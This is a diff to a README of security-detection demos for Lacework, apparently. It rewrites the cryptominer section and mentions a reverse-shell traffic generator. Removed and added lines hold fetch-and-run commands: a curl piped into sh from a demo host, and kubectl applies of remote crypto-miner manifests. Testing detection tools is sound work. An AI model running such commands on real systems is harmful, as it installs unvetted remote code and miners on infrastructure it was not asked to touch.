@@ -52,34 +52,26 @@ go run BasicExfil.go
   
 ### 3. Cryptominer
   
-This example installs and runs XMRig, which is a cryptominer. The installation is not malware and does not propagate. 
+```k8s-crypto-miner``` - Deploy Crypto Miner app to test your Malicious File detection mechanism.  
   
-The Crypto Mining script should be run on a standalone EC2 Instance or Kubernetes deployment with Lacework installed. The exploit will only execute in interactive mode, so once the script is terminated, the exploit will be terminated. It’s recommended to run for at least 1 hour to ensure all steps in the exploit are executed.  
+Just follow the steps below.  
   
-##### Prerequisites
-  - AWS EC2 Linux with Lacework Agent.  
-  - (alternative) AWS K8s Cluster with Lacework Agent.  
+Deploy the Application  
+(you can deploy it within your preferred namespace, here we use default for simplicity).  
   
-##### Linux VM Deployment
+ ```bash
+kubectl apply -f https://raw.githubusercontent.com/jeromebaude/k8s-crypto-miner/main/k8s-crypto-miner.yaml
+````
+Check pods status.  
 ```bash
-curl http://lwmalwaredemo.com/install-demo-1.sh -o install-demo-1.sh; sh install-demo-1.sh;
+kubectl get pods
 ```
   
-##### Kubernetes Deployment
-Deploys a crypto miner malware example for testing the Lacework agent. 
+Check logs.  
   
-Run the following command to deploy the example.  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
+kubectl logs -f crypto-miner-69bc9599f7-qhttn
 ```
-  
-Run the following command to delete the example.  
-
-```bash
-kubectl delete -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
-```
-Here is the script:  
-https://github.com/lacework-dev/scripts/blob/main/k8s-crypto-miner.yaml
   
 ### 4. Lacework Traffic Generator & Reverse Shell
 This project is a browser based web app designed to allow a user to evaluate Lacework anomaly detection. The nodejs app, when run, generates a baseline amount of activity for Lacework to detect. It also includes a reverse shell feature to allow the tester to trigger anomalous and known-bad alerts commonly seen in real-world breaches.
